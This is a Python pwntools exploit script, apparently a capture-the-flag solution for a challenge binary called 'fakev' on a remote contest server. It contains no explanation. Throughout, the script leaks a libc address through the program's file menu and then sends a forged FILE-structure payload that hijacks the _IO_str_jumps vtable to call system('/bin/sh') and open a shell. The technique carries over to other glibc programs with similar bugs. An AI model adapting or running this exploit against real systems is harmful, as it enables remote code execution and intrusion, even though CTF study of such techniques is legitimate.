from pwn import *
context.log_level = 'debug'

#p = process("./fakev")
p = remote('challs.m0lecon.it', 9013)
e = ELF("./fakev")
l = e.libc

def openfile(idx):
    p.recvuntil('5. Exit')
    p.sendline('1')
    p.recvuntil('Index: ')
    p.sendline(idx)

def readfile(idx):
    p.recvuntil('5. Exit')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

def fclose():
    p.recvuntil('5. Exit')
    p.sendline('4')

for i in xrange(8):
    openfile('1')

for i in xrange(8):
    fclose()

readfile('1')

libc = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x3ebca0
str_jump = libc + 0x3e8360
binsh = libc+next(l.search('/bin/sh'))
print hex(libc)

for i in xrange(9):
    openfile('1')

pay = '4aaaaaaa'
pay += p64(0x602118)+p64(0)
pay += p64(0xfbad1800)+p64(0)
pay += p64(0)*2
pay += p64(0)+p64((binsh-100)/2)+p64(0)
pay += p64(0)+p64((binsh-100)/2)
pay += p64(0)*8
pay += p64(e.bss()+0x300)
pay = pay.ljust(0xb0, 'a')
pay += p64(0x602108)
pay = pay.ljust(0xf0, 'b')
pay += p64(str_jump+0x8)+p64(libc+l.symbols['system'])

p.sendlineafter('5. Exit', pay)
